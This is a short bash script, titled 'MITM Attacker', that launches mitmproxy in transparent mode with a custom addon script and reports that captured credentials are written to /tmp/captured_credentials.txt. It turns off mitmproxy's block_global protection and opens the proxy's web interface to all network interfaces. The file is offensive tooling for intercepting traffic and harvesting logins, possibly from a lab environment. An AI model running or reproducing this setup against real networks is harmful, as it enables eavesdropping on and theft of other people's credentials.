#!/bin/bash

echo "=========================================="
echo "  MITM Attacker - Starting..."
echo "=========================================="
echo ""
echo "Web Interface: http://localhost:8888"
echo "Captured data: /tmp/captured_credentials.txt"
echo ""

mitmproxy \
    --mode transparent \
    --showhost \
    --set block_global=false \
    --set confdir=/tmp \
    -s /app/mitm_script.py \
    --web-host 0.0.0.0 \
    --web-port 8888
